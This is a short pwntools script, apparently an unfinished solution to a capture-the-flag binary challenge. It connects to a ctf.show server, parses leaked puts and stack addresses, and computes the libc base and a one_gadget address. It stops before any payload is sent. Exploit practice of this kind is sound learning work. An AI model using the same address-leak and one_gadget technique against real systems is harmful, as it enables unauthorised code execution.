from pwn import*
context(arch ='amd64',os = 'linux',log_level = "debug")
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28225)
libc = ELF("/home/bit/libc/64bit/libc-2.27.so")
io.recvuntil("0x")
puts_addr = int(io.recv(12), 16)
io.recvuntil("0x")
stack_addr = int(io.recv(12), 16)
ret_addr = stack_addr + 0x20
libc_base = puts_addr - libc.sym['puts']
one_gadget = libc_base + 0x4f322
